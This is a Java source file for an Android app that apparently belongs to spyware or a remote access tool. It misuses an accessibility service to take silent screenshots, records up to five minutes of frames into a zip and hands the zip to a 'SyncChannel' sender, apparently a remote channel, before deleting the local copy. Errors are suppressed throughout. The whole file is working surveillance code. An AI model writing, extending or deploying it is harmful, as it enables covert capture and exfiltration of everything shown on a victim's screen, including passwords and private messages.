// language: Java, file: DisplayCapture.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.view.Display;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class DisplayCapture {

    public static String shot() {
        UiService s = UiService.S;
        if (s == null) return null;
        if (Build.VERSION.SDK_INT < 30) return null;

        final Object lock = new Object();
        final String[] out = { null };
        final boolean[] done = { false };

        try {
            s.takeScreenshot(Display.DEFAULT_DISPLAY, s.getMainExecutor(),
                new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult sr) {
                        try {
                            Bitmap hw = Bitmap.wrapHardwareBuffer(
                                sr.getHardwareBuffer(), sr.getColorSpace());
                            Bitmap bm = hw.copy(Bitmap.Config.ARGB_8888, false);
                            ByteArrayOutputStream bo = new ByteArrayOutputStream();
                            bm.compress(Bitmap.CompressFormat.JPEG, 70, bo);
                            out[0] = Base64.encodeToString(bo.toByteArray(), Base64.NO_WRAP);
                            try { bm.recycle(); } catch (Throwable ignored) {}
                        } catch (Throwable ignored) {}
                        finally {
                            try { sr.getHardwareBuffer().close(); } catch (Throwable ignored) {}
                            synchronized (lock) { done[0] = true; lock.notifyAll(); }
                        }
                    }
                    @Override
                    public void onFailure(int err) {
                        synchronized (lock) { done[0] = true; lock.notifyAll(); }
                    }
                });

            synchronized (lock) {
                long end = System.currentTimeMillis() + 3000;
                while (!done[0] && System.currentTimeMillis() < end) lock.wait(500);
            }
        } catch (Throwable t) {
            return null;
        }
        return out[0];
    }

    public static void rec(int seconds) {
        if (seconds <= 0 || seconds > 300) seconds = 5;
        final int total = seconds;
        Thread t = new Thread(() -> {
            File zip = new File(SyncChannel.ctx.getCacheDir(),
                "rec_" + System.currentTimeMillis() + ".zip");
            try {
                ZipOutputStream zo = new ZipOutputStream(new FileOutputStream(zip));
                long end = System.currentTimeMillis() + total * 1000L;
                int i = 0;
                int misses = 0;
                while (System.currentTimeMillis() < end) {
                    String b64 = shot();
                    if (b64 == null) {
                        if (++misses >= 3) break;
                    } else {
                        misses = 0;
                        byte[] raw = Base64.decode(b64, Base64.DEFAULT);
                        zo.putNextEntry(new ZipEntry(String.format("f_%04d.jpg", i++)));
                        zo.write(raw);
                        zo.closeEntry();
                    }
                    try { Thread.sleep(500); } catch (InterruptedException e) { break; }
                }
                zo.close();
                if (i > 0) SyncChannel.sendFile(zip, "rec_" + total + "s_" + i + "frames.zip");
                else SyncChannel.send("<i>rec: no frames captured</i>");
            } catch (Throwable t2) {
                SyncChannel.send("<i>rec err:</i> " + SyncChannel.esc(t2.getMessage()));
            } finally {
                try { zip.delete(); } catch (Throwable ignored) {}
            }
        }, "v2-rec");
        t.setDaemon(true);
        t.start();
    }
}